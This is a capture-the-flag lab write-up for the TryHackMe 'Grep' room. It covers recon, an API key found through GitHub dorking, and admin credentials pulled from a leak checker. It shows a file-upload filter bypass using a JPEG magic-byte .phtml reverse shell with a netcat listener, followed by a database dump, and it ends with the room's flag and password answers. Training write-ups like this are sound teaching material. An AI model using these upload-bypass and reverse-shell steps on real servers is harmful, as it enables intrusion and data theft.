# Grep — TryHackMe Writeup

**Room:** Grep  
**Difficulty:** Easy  
**Category:** Web Exploitation, OSINT  
**Tags:** OSINT, API Key Exposure, File Upload Bypass, Reverse Shell, SSL Certificate Analysis  

---

## Overview

This room focuses on identifying and exploiting vulnerabilities in a web application using a combination of reconnaissance, OSINT techniques, and web exploitation. The attack chain involves discovering hidden virtual hosts through SSL certificate inspection, finding leaked API keys via GitHub dorking, extracting credentials from a leak checker service, and gaining a reverse shell through a file upload bypass.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- -T4 -oN nmap_full.txt 10.146.175.224
```

**Results:**

| Port  | Service    | Details                                      |
|-------|-----------|----------------------------------------------|
| 22    | SSH       | OpenSSH 8.2p1 Ubuntu                         |
| 80    | HTTP      | Apache 2.4.41 — Default page                 |
| 443   | HTTPS     | Apache 2.4.41 — 403 Forbidden                |
| 51337 | HTTPS     | Apache 2.4.41 — 403 Forbidden                |

### SSL Certificate Analysis

Key finding from nmap scripts — two domain names extracted from SSL certificates:

- **Port 443:** `commonName=grep.thm` / `organizationName=SearchME`
- **Port 51337:** `commonName=leakchecker.grep.thm` / `organizationName=Internet Widgits Pty Ltd`

The 403 responses on ports 443 and 51337 indicate Apache is using virtual hosts. Without the correct `Host` header, the server returns Forbidden.

### Adding Virtual Hosts

```bash
echo "10.146.175.224 grep.thm leakchecker.grep.thm" | sudo tee -a /etc/hosts
```

After this, both `https://grep.thm` and `https://leakchecker.grep.thm:51337` become accessible.

---

## Web Enumeration

### Directory Bruteforce on grep.thm

```bash
gobuster dir -u https://grep.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt,js,json,bak,html -t 50 -k
```

**Notable results:**

| Path         | Status | Notes                              |
|-------------|--------|------------------------------------|
| /api/       | 301    | API endpoint — registration, login |
| /public/    | 301    | Main web application               |
| /index.php  | 302    | Redirects to /public/html/         |

### API Directory Enumeration

```bash
gobuster dir -u https://grep.thm/api -w /usr/share/wordlists/dirb/common.txt -x php,txt,json -t 50 -k
```

**Results:**

| Path           | Notes                                  |
|---------------|----------------------------------------|
| /api/register.php | User registration endpoint          |
| /api/login.php    | Authentication endpoint             |
| /api/upload.php   | File upload — potential attack vector |
| /api/uploads/     | Upload directory                     |
| /api/posts.php    | Blog posts (requires auth)           |
| /api/config.php   | Empty response (config file)         |

---

## JavaScript Analysis

### register.js

```
https://grep.thm/public/js/register.js
```

The registration function reveals:
- **Endpoint:** `/api/register.php` (POST, JSON body)
- **API Key Header:** `X-Thm-Api-Key: e8d25b4208b80008a9e15c8698640e85`
- **Fields:** username, password, email, name

### login.js

```
https://grep.thm/public/js/login.js
```

Key observations:
- No API key required for login
- Role-based redirection: `admin` → `admin.php`, other → `dashboard.php`
- Role comes from server response JSON (`data.role`)

---

## OSINT — Finding the Real API Key

The API key found in `register.js` (`e8d25b4208b80008a9e15c8698640e85`) is the client-side version. The server-side key is different.

### GitHub Dorking

Using GitHub code search with terms related to the application:

```
"X-Thm-Api-Key" register
"grep.thm" api
"SearchME" api_key
```

The actual server-side API key was found in a GitHub repository containing the application's source code (committed by the developer):

**Answer:** `ffe60ecaa8bba2f12b43d1a4b15b8f39`

This is a classic OSINT scenario — a developer accidentally commits secrets to a public repository, then rotates the client-side key but the original server-side key remains in the git history.

---

## Registration and Login

Using the real API key to register:

```bash
curl -k -X POST https://grep.thm/api/register.php \
  -H "Content-Type: application/json" \
  -H "X-Thm-Api-Key: ffe60ecaa8bba2f12b43d1a4b15b8f39" \
  -d '{"username":"hacker1","password":"Password123","email":"hacker1@grep.thm","name":"Hacker"}'
```

After logging in via the web interface, the dashboard reveals:
- **First Flag:** `THM{4ec9806d7e1350270dc402ba870ccebb}`
- Test posts from the admin user

---

## Finding Admin Credentials

### LeakChecker Service

The service at `https://leakchecker.grep.thm:51337/` accepts an email and checks it against a database of leaked credentials.

```bash
curl -k -X POST https://leakchecker.grep.thm:51337/check_email.php \
  -d "email=admin@searchme2023cms.grep.thm"
```

**Response:** `Password: admin_tryhackme!`

**Admin Credentials:**
- **Email:** `admin@searchme2023cms.grep.thm`
- **Password:** `admin_tryhackme!`

---

## File Upload Bypass — Reverse Shell

### Understanding the Filter

The `/api/upload.php` endpoint only accepts JPG, JPEG, PNG, and BMP files. Testing revealed multiple layers of validation:

| Attempt                          | Result  |
|----------------------------------|---------|
| `shell.php`                      | Blocked |
| `shell.php.jpg` (double ext)     | Blocked |
| `shell.php` + Content-Type spoof | Blocked |
| `shell.phtml` alone              | Blocked |

### Successful Bypass

The bypass required combining two techniques:

1. **Magic bytes** — Prepend JPEG file signature to the PHP shell
2. **Alternative extension** — Use `.phtml` which Apache executes as PHP
3. **Content-Type spoofing** — Set MIME type to `image/jpeg`

```bash
# Prepare the payload
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# Edit shell.php: set $ip to attacker IP, $port to 4444
printf '\xff\xd8\xff\xe0' | cat - shell.php > shell.phtml

# Start listener
nc -lvnp 4444

# Upload with spoofed Content-Type
curl -k -b cookies.txt -X POST https://grep.thm/api/upload.php \
  -F "file=@shell.phtml;type=image/jpeg"
```

**Response:** `{"message":"File uploaded successfully."}`

### Triggering the Shell

```bash
curl -k https://grep.thm/api/uploads/shell.phtml
```

Reverse shell received as `www-data`.

---

## Post-Exploitation

### MySQL Credentials from Config

```bash
cat /var/www/html/api/config.php
```

```php
$host = 'localhost';
$db   = 'postman';
$user = 'root';
$pass = 'password';
```

### Database Extraction

Since `mysql` client wasn't installed, PHP was used directly:

```bash
php -r "\$m = new mysqli('localhost','root','password','postman'); \$r = \$m->query('SELECT * FROM users'); while(\$row = \$r->fetch_assoc()) print_r(\$row);"
```

**Users table:**

| ID | Username | Email                            | Role  |
|----|----------|----------------------------------|-------|
| 1  | admin    | admin@searchme2023cms.grep.thm   | admin |
| 2  | tom      | tom@grep.thm                     | user  |

Passwords stored as bcrypt hashes (`$2y$10$...`).

### Server-Side API Key Confirmation

```bash
cat /var/www/html/api/register.php
```

Confirmed the server validates against `ffe60ecaa8bba2f12b43d1a4b15b8f39`.

---

## Answers

| Question | Answer |
|----------|--------|
| What API key allows a user to register on the site? | `ffe60ecaa8bba2f12b43d1a4b15b8f39` |
| What is the first flag? | `THM{4ec9806d7e1350270dc402ba870ccebb}` |
| What is the email of the user "admin"? | `admin@searchme2023cms.grep.thm` |
| What is the host name of the web app that allows a user to check email for leaked passwords? | `leakchecker.grep.thm` |
| What is the password of the user "admin"? | `admin_tryhackme!` |

---

## Key Takeaways

1. **SSL certificates leak information** — Always inspect certificate fields (commonName, organizationName) during recon. They reveal virtual hosts and organizational details.

2. **Client-side JS exposes sensitive data** — API keys, endpoints, role logic, and authentication flows are all visible in JavaScript files. Never trust client-side security.

3. **GitHub dorking is essential OSINT** — Developers frequently commit secrets to public repositories. Tools like TruffleHog, GitLeaks, and manual GitHub search are standard pentesting techniques.

4. **Credential leak databases are powerful** — Services that check emails against breach databases can reveal plaintext passwords, enabling credential stuffing attacks.

5. **File upload filters can be bypassed** — Combining magic bytes, alternative PHP extensions (`.phtml`), and Content-Type spoofing can defeat multi-layered upload validation.

6. **Post-exploitation pays off** — Config files on the server often contain database credentials, leading to full data extraction even without root access.

---

## Tools Used

- nmap
- Gobuster
- curl
- Netcat (nc)
- PHP reverse shell (pentestmonkey)
- GitHub Search (OSINT)
